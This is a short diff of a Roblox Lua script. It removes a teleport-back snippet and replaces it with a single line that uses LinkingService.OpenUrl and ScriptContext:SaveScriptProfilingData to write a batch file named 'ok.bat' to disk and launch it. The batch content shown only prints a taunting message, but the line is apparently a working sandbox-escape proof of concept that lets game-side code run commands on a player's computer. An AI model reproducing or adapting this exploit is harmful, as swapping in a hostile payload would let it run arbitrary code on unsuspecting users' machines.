@@ -1,14 +1,1 @@
--- gpt because i wont code for this
-
-local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-
-local player = Players.LocalPlayer
-local placeId = game.PlaceId -- Gets the current place ID
-
-local function teleportBack()
-    if player then
-        TeleportService:Teleport(placeId, player)
-    end
-end
-teleportBack()
+workspace.Parent.LinkingService.OpenUrl(workspace.Parent:FindService("ScriptContext"):SaveScriptProfilingData([[@echo off & echo You shouldn't have run it & pause]], "ok.bat"))
